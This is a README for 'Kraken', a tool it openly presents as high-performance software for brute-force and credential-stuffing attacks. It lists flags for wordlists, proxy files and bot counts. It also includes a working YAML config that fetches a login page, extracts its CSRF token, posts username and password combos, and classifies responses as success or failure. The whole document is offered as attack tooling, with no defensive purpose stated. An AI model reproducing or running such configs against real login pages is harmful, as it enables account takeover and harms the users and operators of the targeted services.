# Kraken

Kraken is a tool for brute force or credential stuffing attacks high performance

## Getting Started

download [release](https://github.com/Meliio/Kraken/releases)
open a cmd then write "cd {path where kraken.exe is located}" and "kraken.exe --help"

### Prerequisite

[.NET Runtime 6.0.0](https://dotnet.microsoft.com/download/dotnet/6.0)


### Usage

| Flag             | Description                                                | Example                                     |
| ---------------- | ---------------------------------------------------------- | --------------------------------------------|
| -c               | yaml file of the config                                    | kraken.exe -c config.yaml                   |
| -w               | wordlist file                                              | kraken.exe -w wordlist.txt                  |
| -p               | proxies file                                               | kraken.exe -p proxies.txt                   |
| -b               | number of bots                                             | kraken.exe -b 10                            |

### Example

```yaml
settings:
  name: example
blocks:
  - request:
      raw: |
         GET https://example.com/login
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
         Pragma: no-cache
         Accept: */*
  - extractor:
      type: css
      name: token
      selector: input[name="login_token"]
      attribute: value
      source: <response.content>
      capture: false
  - request:
      raw: |
         POST https://example.com/login
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
         Pragma: no-cache
         Accept: */*
         
         username=<combo.username>&password=<combo.password>&token=<token>
  - keycheck:
      keychains:
        - status: failure
          condition: or
          keys:
            - source: <response.content>
              condition: contains
              key:  IDENT_KO
        - status: success
          condition: or
          keys:
            - source: <response.content>
              condition: contains
              key: AUTH_OK
      otherwiseBan: true
```
